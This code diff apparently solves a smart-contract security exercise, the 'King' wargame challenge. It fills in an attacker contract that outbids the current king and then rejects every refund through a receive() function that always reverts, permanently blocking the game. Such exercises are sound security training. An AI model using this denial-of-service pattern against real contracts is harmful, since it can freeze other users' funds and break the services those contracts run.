@@ -3,6 +3,10 @@ pragma solidity ^0.8.9;
 import "./King.sol";
 import "hardhat/console.sol";
 
+interface IKing {
+    function prize() external returns (uint);
+}
+
 contract AttackingKing {
     address public contractAddress;
 
@@ -11,6 +15,13 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        uint bid = IKing(contractAddress).prize() + 1 wei;
+        (bool success, ) = contractAddress.call{value: bid}("");
+        require(success);
     }
+
+    receive() external payable {
+        revert();
+    }
+
 }
